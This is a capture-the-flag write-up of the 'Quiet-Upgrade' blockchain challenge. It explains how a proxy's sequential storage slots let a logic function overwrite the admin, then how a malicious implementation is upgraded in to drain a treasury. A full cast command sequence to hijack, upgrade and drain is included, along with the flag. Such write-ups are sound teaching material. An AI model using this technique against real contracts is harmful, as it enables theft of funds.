---
title: "Quiet-Upgrade"
ctf: "2026-hiCTF"
category: "blockchain"
difficulty: "Not specified"
points: null
techniques: ["hash-collision", "blockchain", "smart-contract", "vm-reverse"]
tools: ["python"]
keywords: ["Quiet-Upgrade", "hiCTF", "blockchain", "hash-collision", "smart-contract", "vm-reverse", "python"]
status: "solved"
has_script: true
source: "hiCTF/Blockchain/Quiet-Upgrade/notes.md"
---

# Quiet-Upgrade (hiCTF, blockchain)

## Summary
Challenge **Quiet-Upgrade** from the hiCTF CTF, blockchain category. Main technique: hash-collision. Proxy with sequential slots (non-EIP-1967): logic variables override admin/implementation. Find a logic function that writes slot0/slot1.

## Statement and artefacts
- `Evil.sol`: malicious implementation (`proxiableSlot()` + `drain()`).
- `exploit.py`: exploit **ready for live** — `RPC_URL=... PRIVKEY=0x... SETUP=0x... python3 exploit.py`. Bytecode of `Evil` **embedded** (no need for `solc` on the box). Reads addresses via public getters from `Setup`.
- `poc_local.py`: full offline reproduction (solcx 0.8.24 + py-evm) which deploys `Setup` and proves `isSolved()=true`. Launch: `python3 poc_local.py` (from a Friday with `py-solc-x web3 eth-tester[py-evm]`).

**Provided files / artifacts:**
- `quiet-upgrade.zip (archive, 6.2 KB)`
- `work/Evil.sol (Solidity contract, 1.1 KB)`

## Recognition signals
- If we observe SettlementV1.registerBranch(operator) writes branchOperator = slot 0, think about via delegatecall, overwrites the proxy admin (slot 0).
- Signal: Onboarding is open (branchRegistrar never wired; branchClaimed just limits 1 call per caller).
- Signal: ⇒ registerBranch(me) makes me admin of the proxy. Then upgradeTo() is open to me.
- Signal: release() is based on msg.sender. Logic installed via upgradeTo and executed in delegatecall sends the call to release() from the address of the proxy = settlementSystem -> authorized.

## Resolution method
1. **Architecture**

- `SettlementProxy`: **naive** delegatecall proxy — `slot0 = admin`, `slot1 = implementation` (sequential slots, NOT hashed EIP-1967). `upgradeTo(newImpl)` reserved for admin; the candidate must prove via `proxiableSlot()` that it returns `keccak256(QU_TAG, address(proxy))`.
- `SettlementV1` (logic behind the proxy) — slots in the **proxy storage**: `slot0 branchOperator` / `slot1 branchRegistrar` / `slot2 branchClaimed` / `slot3 ledger` / `slot4 totalSettled`.
- `Treasury`: 5,000,000 STL; `release()` only accepts `msg.sender == settlementSystem` (= the proxy).
- `Ops`: “legitimate” initial admin of the proxy, inaccessible to the player.

2. **Exploit (3 transactions, since funded EOA)**

1. `proxy.registerBranch(ME)` → `admin (slot0) = ME`.
2. deploy `Evil`; `proxy.upgradeTo(Evil)` → `implementation (slot1) = Evil`.
   - `Evil.proxiableSlot()` is called **STATICCALL** by the proxy, therefore `msg.sender == proxy`: we return `keccak256(abi.encodePacked(keccak256("quiet-upgrade.proxiable"), msg.sender))` = the expected value, without knowing the proxy address in advance.
3. `proxy.drain(treasury, ME)` → delegatecall `Evil.drain` → `Treasury.release(ME, reserveBalance())`. `msg.sender` seen by Treasury = proxy ⇒ transfer of **entire** reserve. `isSolved() = true`.

3. **Cast equivalent (if foundry available tomorrow)**

```bash
export RPC=... PK=0x... SETUP=0x...
PROXY=$(cast call $SETUP "proxy()(address)" --rpc-url $RPC)
TRES=$(cast call $SETUP "treasury()(address)" --rpc-url $RPC)
ME=$(cast wallet address --private-key $PK)
# 1) steal the admin
cast send $PROXY "registerBranch(address)" $ME --private-key $PK --rpc-url $RPC
# 2) deploy Evil + upgrade
EVIL=$(forge create work/Evil.sol:Evil --private-key $PK --rpc-url $RPC --json | jq -r .deployedTo)
cast send $PROXY "upgradeTo(address)" $EVIL --private-key $PK --rpc-url $RPC
# 3) drain
cast send $PROXY "drain(address,address)" $TRES $ME --private-key $PK --rpc-url $RPC
cast call $SETUP "isSolved()(bool)" --rpc-url $RPC
```

4. **The rift (collision of slots)**

- `SettlementV1.registerBranch(operator)` writes `branchOperator` = **slot 0** → via delegatecall, overwrites the **`admin`** of the proxy (slot 0).
- Onboarding is **open** (`branchRegistrar` never wired; `branchClaimed` just limits 1 call per caller).
- ⇒ `registerBranch(me)` **makes me proxy admin**. Then `upgradeTo()` is opened to me.
- `release()` is based on `msg.sender`. Logic installed via `upgradeTo` and executed in **delegatecall** sends the call to `release()` from the address **of the proxy** = `settlementSystem` → authorized.

## Solve script
Script path: [scripts/exploit.py](scripts/exploit.py)
Script path: [scripts/poc_local.py](scripts/poc_local.py)

## Flag
hiCTF{sl0t0_c0llision_then_a_qu1et_upgrade_fd75e36921}

## Lessons and reusable patterns
- Proxy with sequential slots (non-EIP-1967): logic variables override admin/implementation. Find a logic function that writes slot0/slot1.
- Onboarding/unguarded setter = write primitive on a slot which collides a critical field of the proxy.
- proxiableSlot() linked to address(this) of the proxy can be bypassed: as the check is a STATICCALL (not delegated), msg.sender in the candidate = the proxy -> we derive the expected value on the fly.
- delegatecall + access control by msg.sender: code installed behind the proxy speaks to Treasury “as” proxy -> crosses the require(msg.sender == settlementSystem).
